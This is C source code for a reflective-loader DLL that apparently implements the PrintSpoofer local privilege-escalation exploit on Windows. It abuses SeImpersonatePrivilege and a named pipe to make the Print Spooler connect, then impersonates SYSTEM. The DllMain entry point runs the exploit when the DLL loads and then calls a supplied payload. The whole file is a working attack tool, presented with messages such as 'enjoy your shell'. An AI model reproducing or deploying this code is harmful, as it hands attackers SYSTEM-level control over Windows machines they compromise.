#include "ReflectiveLoader.h"
#include "PrintSpoofer.h"
#include <iostream>

extern HINSTANCE hAppInstance;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;

BOOL PrintSpoofer() {
	BOOL bResult = TRUE;
	LPWSTR pwszPipeName = NULL;
	HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
	HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
	DWORD dwWait = 0;

	if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME)) {
		wprintf(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
		bResult = FALSE;
		goto cleanup;
	}

	wprintf(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);

	if (!GenerateRandomPipeName(&pwszPipeName)) {
		wprintf(L"[-] Failed to generate a name for the pipe.\n");
		bResult = FALSE;
		goto cleanup;
	}

	if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName))) {
		wprintf(L"[-] Failed to create a named pipe.\n");
		bResult = FALSE;
		goto cleanup;
	}

	if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe))) {
		wprintf(L"[-] Failed to connect the named pipe.\n");
		bResult = FALSE;
		goto cleanup;
	}

	wprintf(L"[+] Named pipe listening...\n");

	if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName))) {
		wprintf(L"[-] Failed to trigger the Spooler service.\n");
		bResult = FALSE;
		goto cleanup;
	}

	dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
	if (dwWait != WAIT_OBJECT_0) {
		wprintf(L"[-] Operation failed or timed out.\n");
		bResult = FALSE;
		goto cleanup;
	}

	if (!GetSystem(hSpoolPipe)) {
		bResult = FALSE;
		goto cleanup;
	}
	wprintf(L"[+] Exploit successfully, enjoy your shell\n");

cleanup:
	if (hSpoolPipe)
		CloseHandle(hSpoolPipe);
	if (hSpoolPipeEvent)
		CloseHandle(hSpoolPipeEvent);
	if (hSpoolTriggerThread)
		CloseHandle(hSpoolTriggerThread);

	return bResult;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;

	switch (dwReason) {
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		if (PrintSpoofer()) {
			fflush(stdout);

			if (lpReserved != NULL)
				((VOID(*)())lpReserved)();
		} else {
			fflush(stdout);
		}
	
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}